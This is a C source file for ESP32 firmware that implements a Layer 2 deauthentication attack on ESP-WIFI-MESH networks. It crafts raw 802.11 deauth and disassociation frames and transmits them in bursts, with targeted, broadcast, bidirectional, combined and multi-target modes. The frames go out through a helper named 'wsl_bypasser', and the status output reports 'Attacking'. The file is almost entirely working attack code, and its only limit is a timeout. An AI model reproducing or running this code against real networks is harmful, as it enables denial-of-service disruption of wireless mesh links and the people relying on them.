/**
 * mesh_l2_deauth.c
 *
 * Layer 2 deauthentication against ESP-WIFI-MESH parent/child links.
 * Soft-AP pauses during attack; auto-stops after MESH_L2_DEAUTH_TIMEOUT_SEC.
 */

#include "mesh_l2_deauth.h"

#include <string.h>
#include <stdio.h>

#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "MESH_L2_DEAUTH";

static const char *mode_strings[] = {
    [MESH_L2_DEAUTH_MODE_NONE]            = "Idle",
    [MESH_L2_DEAUTH_MODE_TARGETED]        = "Targeted",
    [MESH_L2_DEAUTH_MODE_BROADCAST]       = "Broadcast",
    [MESH_L2_DEAUTH_MODE_BIDIRECTIONAL]   = "Bidirectional",
    [MESH_L2_DEAUTH_MODE_DEAUTH_DISASSOC] = "Deauth+Disassoc",
    [MESH_L2_DEAUTH_MODE_MULTI_TARGET]    = "Multi-Target",
};

static mesh_l2_deauth_state_t  s_state;
static mesh_l2_deauth_config_t s_cfg;
static volatile bool           s_running = false;
static TaskHandle_t            s_task = NULL;
static esp_timer_handle_t      s_timeout_timer = NULL;
static SemaphoreHandle_t       s_mutex = NULL;
static bool                    s_ap_was_stopped = false;

const char *mesh_l2_deauth_mode_str(mesh_l2_deauth_mode_t m)
{
    if (m >= MESH_L2_DEAUTH_MODE_COUNT) return "Unknown";
    return mode_strings[m];
}

static bool mutex_take(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
        if (s_mutex == NULL) return false;
    }
    return xSemaphoreTake(s_mutex, pdMS_TO_TICKS(2000)) == pdTRUE;
}

static void mutex_give(void)
{
    if (s_mutex != NULL) {
        xSemaphoreGive(s_mutex);
    }
}

static uint16_t build_deauth(uint8_t *out, size_t max_len,
                             const uint8_t *dest, const uint8_t *src,
                             const uint8_t *bssid, uint16_t reason)
{
    if (max_len < 26) return 0;
    memset(out, 0, 26);
    out[0] = 0xC0;
    out[1] = 0x00;
    out[2] = 0x3a;
    out[3] = 0x01;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = (uint8_t)(reason & 0xFF);
    out[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}

static uint16_t build_disassoc(uint8_t *out, size_t max_len,
                               const uint8_t *dest, const uint8_t *src,
                               const uint8_t *bssid, uint16_t reason)
{
    if (max_len < 26) return 0;
    memset(out, 0, 26);
    out[0] = 0xA0;
    out[1] = 0x00;
    out[2] = 0x3a;
    out[3] = 0x01;
    memcpy(out + 4,  dest,  6);
    memcpy(out + 10, src,   6);
    memcpy(out + 16, bssid, 6);
    out[24] = (uint8_t)(reason & 0xFF);
    out[25] = (uint8_t)((reason >> 8) & 0xFF);
    return 26;
}

static bool send_frame(const uint8_t *frame, uint16_t len)
{
    return wsl_bypasser_send_raw_frame(frame, len);
}

static uint8_t resolve_tx_channel(uint8_t requested)
{
    if (requested > 0) return requested;
#ifndef CONFIG_MGMT_AP_CHANNEL
#define CONFIG_MGMT_AP_CHANNEL 6
#endif
    return CONFIG_MGMT_AP_CHANNEL;
}

static bool prepare_radio(uint8_t channel)
{
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    s_ap_was_stopped = false;
    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        wifictl_mgmt_ap_stop();
        s_ap_was_stopped = true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_err_t ch_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGW(TAG, "Channel set to %u failed: %s", channel, esp_err_to_name(ch_err));
    }
    return true;
}

static void restore_radio(void)
{
    if (s_ap_was_stopped) {
        wifictl_mgmt_ap_start();
        s_ap_was_stopped = false;
    }
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "L2 Deauth timeout (%d s)", MESH_L2_DEAUTH_TIMEOUT_SEC);
    if (mutex_take()) {
        s_state.timeout = true;
        mutex_give();
    }
    mesh_l2_deauth_stop();
}

static void start_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
    const esp_timer_create_args_t args = {
        .callback = timeout_cb,
        .name     = "mesh_l2d_to",
    };
    if (esp_timer_create(&args, &s_timeout_timer) == ESP_OK) {
        esp_timer_start_once(s_timeout_timer, MESH_L2_DEAUTH_TIMEOUT_US);
    }
}

static void stop_timeout_timer(void)
{
    if (s_timeout_timer != NULL) {
        esp_timer_stop(s_timeout_timer);
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }
}

static void tx_one(const uint8_t *dest, const uint8_t *src, const uint8_t *bssid,
                   bool disassoc)
{
    uint8_t frame[32];
    uint16_t len = disassoc
        ? build_disassoc(frame, sizeof(frame), dest, src, bssid, s_cfg.reason_code)
        : build_deauth(frame, sizeof(frame), dest, src, bssid, s_cfg.reason_code);

    if (len == 0) {
        snprintf(s_state.error, sizeof(s_state.error), "Frame build failed");
        return;
    }

    if (send_frame(frame, len)) {
        s_state.packets_sent++;
        if (disassoc) {
            s_state.disassoc_sent++;
        } else {
            s_state.deauth_sent++;
        }
    } else {
        s_state.packets_failed++;
        vTaskDelay(pdMS_TO_TICKS(2));
    }
}

static void tx_burst(uint32_t tick)
{
    const uint8_t *parent = s_cfg.parent_bssid;
    uint8_t bcast[6];
    memset(bcast, 0xFF, 6);

    uint16_t burst = s_cfg.burst_size;
    if (burst == 0) burst = 1;
    if (burst > 32) burst = 32;

    for (uint16_t b = 0; b < burst && s_running; b++) {
        const uint8_t *dest = s_cfg.target_mac_set ? s_cfg.target_mac : bcast;

        if (s_cfg.mode == MESH_L2_DEAUTH_MODE_BROADCAST) {
            dest = bcast;
        } else if (s_cfg.mode == MESH_L2_DEAUTH_MODE_MULTI_TARGET &&
                   s_cfg.extra_target_count > 0) {
            dest = s_cfg.extra_targets[(tick + b) % s_cfg.extra_target_count];
        }

        switch (s_cfg.mode) {
            case MESH_L2_DEAUTH_MODE_TARGETED:
            case MESH_L2_DEAUTH_MODE_BROADCAST:
            case MESH_L2_DEAUTH_MODE_MULTI_TARGET:
                /* Parent → child/broadcast */
                tx_one(dest, parent, parent, false);
                break;

            case MESH_L2_DEAUTH_MODE_BIDIRECTIONAL:
                /* Parent → child */
                tx_one(dest, parent, parent, false);
                /* Child → parent (if dest is unicast) */
                if (memcmp(dest, bcast, 6) != 0) {
                    tx_one(parent, dest, parent, false);
                }
                break;

            case MESH_L2_DEAUTH_MODE_DEAUTH_DISASSOC:
                tx_one(dest, parent, parent, false);
                tx_one(dest, parent, parent, true);
                if (memcmp(dest, bcast, 6) != 0) {
                    tx_one(parent, dest, parent, false);
                    tx_one(parent, dest, parent, true);
                }
                break;

            default:
                break;
        }
        if (b + 1 < burst && s_running) {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
}

static void deauth_task(void *arg)
{
    (void)arg;

    ESP_LOGW(TAG, "═══ MESH L2 DEAUTH START ═══ mode=%s ch=%u interval=%u burst=%u",
             mesh_l2_deauth_mode_str(s_cfg.mode),
             s_cfg.channel, s_cfg.interval_ms, s_cfg.burst_size);

    uint8_t tx_channel = resolve_tx_channel(s_cfg.channel);
    s_cfg.channel = tx_channel;
    s_state.channel = tx_channel;
    prepare_radio(tx_channel);

    uint32_t start_us = (uint32_t)esp_timer_get_time();
    uint32_t tick = 0;

    while (s_running) {
        tx_burst(tick);
        tick++;
        s_state.uptime_ms = (uint32_t)((esp_timer_get_time() - start_us) / 1000);

        if (s_cfg.interval_ms > 0) {
            vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms));
        } else {
            taskYIELD();
        }
    }

    ESP_LOGI(TAG, "L2 Deauth done: sent=%lu failed=%lu deauth=%lu disassoc=%lu",
             (unsigned long)s_state.packets_sent,
             (unsigned long)s_state.packets_failed,
             (unsigned long)s_state.deauth_sent,
             (unsigned long)s_state.disassoc_sent);

    stop_timeout_timer();
    restore_radio();
    s_state.active = false;
    s_running = false;
    s_task = NULL;
    vTaskDelete(NULL);
}

void mesh_l2_deauth_init(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
    memset(&s_state, 0, sizeof(s_state));
    s_running = false;
    ESP_LOGI(TAG, "Mesh L2 Deauth ready (%d modes)", (int)MESH_L2_DEAUTH_MODE_COUNT - 1);
}

esp_err_t mesh_l2_deauth_start(const mesh_l2_deauth_config_t *cfg)
{
    if (!cfg) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;

    uint8_t zero[6] = {0};
    if (memcmp(cfg->parent_bssid, zero, 6) == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->mode <= MESH_L2_DEAUTH_MODE_NONE || cfg->mode >= MESH_L2_DEAUTH_MODE_COUNT) {
        return ESP_ERR_INVALID_ARG;
    }

    memset(&s_state, 0, sizeof(s_state));
    memcpy(&s_cfg, cfg, sizeof(s_cfg));

    if (!s_cfg.target_mac_set) {
        memset(s_cfg.target_mac, 0xFF, 6);
    }
    if (s_cfg.burst_size == 0) {
        s_cfg.burst_size = 5;
    }
    if (s_cfg.interval_ms == 0) {
        s_cfg.interval_ms = 50;
    }
    if (s_cfg.reason_code == 0) {
        s_cfg.reason_code = 7;
    }

    s_state.active = true;
    s_state.mode = s_cfg.mode;
    s_state.channel = s_cfg.channel;
    memcpy(s_state.parent_bssid, s_cfg.parent_bssid, 6);
    memcpy(s_state.target_mac, s_cfg.target_mac, 6);
    strncpy(s_state.ssid, s_cfg.ssid, sizeof(s_state.ssid) - 1);
    strncpy(s_state.mode_str, mesh_l2_deauth_mode_str(s_cfg.mode),
            sizeof(s_state.mode_str) - 1);

    s_running = true;
    start_timeout_timer();

    if (xTaskCreate(deauth_task, "mesh_l2d", 6144, NULL, 2, &s_task) != pdPASS) {
        s_running = false;
        s_state.active = false;
        stop_timeout_timer();
        return ESP_ERR_NO_MEM;
    }

    return ESP_OK;
}

esp_err_t mesh_l2_deauth_stop(void)
{
    if (!s_running && !s_state.active) {
        restore_radio();
        return ESP_OK;
    }

    s_running = false;
    stop_timeout_timer();

    int wait = 30;
    while (s_task && wait-- > 0) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    restore_radio();
    s_state.active = false;
    return ESP_OK;
}

bool mesh_l2_deauth_is_active(void)
{
    return s_running || s_state.active;
}

const mesh_l2_deauth_state_t *mesh_l2_deauth_get_state(void)
{
    return &s_state;
}

cJSON *mesh_l2_deauth_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    const mesh_l2_deauth_state_t *st = &s_state;

    cJSON_AddBoolToObject(root, "active", st->active || s_running);
    cJSON_AddBoolToObject(root, "running", st->active || s_running);
    cJSON_AddBoolToObject(root, "timeout", st->timeout);
    cJSON_AddNumberToObject(root, "packets_sent", st->packets_sent);
    cJSON_AddNumberToObject(root, "packets_failed", st->packets_failed);
    cJSON_AddNumberToObject(root, "deauth_sent", st->deauth_sent);
    cJSON_AddNumberToObject(root, "disassoc_sent", st->disassoc_sent);
    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
    cJSON_AddNumberToObject(root, "mode", st->mode);
    cJSON_AddStringToObject(root, "mode_str",
        st->mode_str[0] ? st->mode_str : mesh_l2_deauth_mode_str(st->mode));
    cJSON_AddNumberToObject(root, "channel", st->channel);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->parent_bssid[0], st->parent_bssid[1], st->parent_bssid[2],
             st->parent_bssid[3], st->parent_bssid[4], st->parent_bssid[5]);
    cJSON_AddStringToObject(root, "parent_bssid", mac);
    cJSON_AddStringToObject(root, "bssid", mac);

    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             st->target_mac[0], st->target_mac[1], st->target_mac[2],
             st->target_mac[3], st->target_mac[4], st->target_mac[5]);
    cJSON_AddStringToObject(root, "target_mac", mac);

    cJSON_AddStringToObject(root, "ssid", st->ssid);

    if (st->error[0]) {
        cJSON_AddStringToObject(root, "error", st->error);
    }

    cJSON_AddStringToObject(root, "status",
        (st->active || s_running) ? "Attacking" :
        (st->timeout ? "Timeout" : "Idle"));

    return root;
}
